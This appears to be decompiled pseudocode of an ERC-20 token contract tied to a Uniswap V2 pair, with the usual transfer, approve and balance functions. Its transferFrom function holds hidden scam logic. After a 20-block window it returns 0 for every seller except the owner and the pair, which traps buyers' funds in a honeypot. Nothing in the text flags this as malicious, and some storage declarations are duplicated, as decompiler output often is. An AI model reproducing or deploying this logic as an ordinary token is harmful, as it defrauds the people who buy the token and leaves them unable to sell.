contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
address owner;
uint8 stor5; offset 160
uint128 stor5; offset 160
address uniswapV2PairAddress;
uint256 blockNum;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function uniswapV2Pair() payable {
    return uniswapV2PairAddress
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function sub_7b162c93(?) payable {
    return bool(uint8(stor5.field_160))
}

function blockNum() payable {
    return blockNum
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    balanceOf[address(msg.sender)] -= arg2
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not uint8(stor5.field_160):
        Mask(96, 0, stor5.field_160) = 1
        blockNum = block.number + 20
    else:
        if arg1 != owner:
            if arg1 != uniswapV2PairAddress:
                if blockNum <= block.number:
                    return 0
    allowance[address(arg1)][address(msg.sender)] -= arg3
    balanceOf[address(arg1)] -= arg3
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
